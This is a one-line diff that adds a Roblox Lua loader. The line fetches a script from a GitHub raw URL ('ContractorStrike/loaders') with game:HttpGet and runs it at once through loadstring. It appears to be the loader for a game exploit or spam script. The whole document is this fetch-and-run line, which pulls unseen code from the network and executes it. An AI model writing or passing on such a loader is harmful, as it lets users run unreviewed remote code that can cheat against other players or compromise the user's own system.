@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/upd-8-cvr-retro-spam6-6td3mbl0gyafaj.lua"))()
